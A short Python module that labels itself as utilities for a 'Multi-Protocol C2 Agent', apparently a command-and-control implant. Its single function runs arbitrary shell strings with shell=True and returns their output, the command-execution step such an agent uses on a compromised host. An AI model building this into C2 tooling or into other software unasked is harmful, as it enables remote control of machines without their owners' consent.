"""
Utility functions for Multi-Protocol C2 Agent
"""

import subprocess


def execute_command(command, timeout=300):
    """
    Execute command and return output
    
    Args:
        command (str): Shell command to execute
        timeout (int): Command timeout in seconds
    
    Returns:
        str: Command output or error message
    """
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        output = result.stdout
        if result.stderr:
            output += f"\nErrors:\n{result.stderr}"
        
        return output if output else "Command completed"
    
    except subprocess.TimeoutExpired:
        return f"Error: Command timed out after {timeout} seconds"
    except Exception as e:
        return f"Error: {str(e)}"